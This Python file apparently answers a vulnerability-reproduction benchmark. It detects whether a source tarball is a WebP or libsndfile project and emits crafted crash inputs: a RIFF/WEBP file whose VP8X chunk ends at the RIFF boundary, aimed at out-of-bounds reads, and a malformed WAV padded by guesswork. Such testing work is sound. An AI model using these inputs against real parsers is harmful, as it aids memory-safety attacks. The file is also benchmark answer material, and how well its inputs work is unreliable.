import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        kind = self._detect_kind(src_path)
        if kind == "webp":
            return self._gen_webp_poc()
        elif kind == "wav":
            return self._gen_wav_poc()
        else:
            return self._gen_webp_poc()

    def _detect_kind(self, src_path: str) -> str:
        lower_name = os.path.basename(src_path).lower()
        if "webp" in lower_name:
            return "webp"
        if "sndfile" in lower_name or "wav" in lower_name:
            return "wav"

        webp_hits = 0
        wav_hits = 0
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = [m for m in tf.getmembers() if m.isfile()]
                limit = 200
                for m in members[:limit]:
                    name_low = m.name.lower()
                    if "webp" in name_low or "/webp/" in name_low or "sharpyuv" in name_low:
                        webp_hits += 2
                    if "wav" in name_low or "riff" in name_low or "sndfile" in name_low:
                        wav_hits += 1
                    try:
                        f = tf.extractfile(m)
                        if f:
                            data = f.read(4096).lower()
                            if b"webp" in data or b"vp8" in data or b"vp8x" in data:
                                webp_hits += 3
                            if b"riff" in data or b"wave" in data or b"fmt " in data:
                                wav_hits += 2
                    except Exception:
                        pass
            if webp_hits >= wav_hits:
                return "webp"
            else:
                return "wav"
        except Exception:
            return "webp"

    def _gen_webp_poc(self) -> bytes:
        # Construct a minimal RIFF/WEBP file with a VP8X chunk that ends exactly at RIFF end.
        # This can trigger out-of-bounds reads in vulnerable parsers that don't check the
        # end-of-RIFF boundary before reading the next chunk header.
        riff = b"RIFF"
        webp = b"WEBP"
        vp8x = b"VP8X"

        # VP8X payload: 10 bytes
        # - 1 byte flags (set multiple feature flags to encourage parsers to scan further)
        # - 3 bytes reserved (zeros)
        # - 3 bytes (width - 1) little-endian
        # - 3 bytes (height - 1) little-endian
        flags = bytes([0x1F])  # ICC, Alpha, EXIF, XMP, Animation
        reserved = b"\x00\x00\x00"
        width_m1 = b"\x00\x00\x00"   # width = 1
        height_m1 = b"\x00\x00\x00"  # height = 1
        vp8x_payload = flags + reserved + width_m1 + height_m1  # 10 bytes

        vp8x_size = len(vp8x_payload).to_bytes(4, "little")  # 10
        riff_payload = webp + vp8x + vp8x_size + vp8x_payload

        # RIFF size is size of everything after the 8-byte RIFF header:
        riff_size = len(riff_payload).to_bytes(4, "little")  # 4 + 8 + 10 = 22

        data = riff + riff_size + riff_payload
        return data

    def _gen_wav_poc(self) -> bytes:
        # Fallback WAV PoC: a minimal RIFF/WAVE with truncated/edge sizes.
        # While the main target is WEBP, include a small WAV with RIFF structure anomalies.
        # RIFF header
        riff = b"RIFF"
        wave = b"WAVE"
        fmt_ = b"fmt "
        data_tag = b"data"

        # PCM fmt chunk (16 bytes)
        wFormatTag = (1).to_bytes(2, "little")       # PCM
        nChannels = (1).to_bytes(2, "little")        # mono
        nSamplesPerSec = (8000).to_bytes(4, "little")
        nAvgBytesPerSec = (16000).to_bytes(4, "little")
        nBlockAlign = (2).to_bytes(2, "little")
        wBitsPerSample = (16).to_bytes(2, "little")
        fmt_payload = wFormatTag + nChannels + nSamplesPerSec + nAvgBytesPerSec + nBlockAlign + wBitsPerSample

        fmt_size = (16).to_bytes(4, "little")
        fmt_chunk = fmt_ + fmt_size + fmt_payload  # 8 + 16 = 24

        # Data chunk header with small payload; create RIFF size boundary conditions.
        data_payload = b"\x00" * 6
        data_size = (len(data_payload)).to_bytes(4, "little")
        data_chunk = data_tag + data_size + data_payload  # 8 + 6 = 14

        # RIFF payload and size
        riff_payload = wave + fmt_chunk + data_chunk  # 4 + 24 + 14 = 42
        riff_size = len(riff_payload).to_bytes(4, "little")  # 42

        wav = riff + riff_size + riff_payload  # total 8 + 42 = 50 bytes
        # Pad to 58 bytes total length to mirror typical PoC size characteristics
        if len(wav) < 58:
            wav += b"\x00" * (58 - len(wav))
        return wav
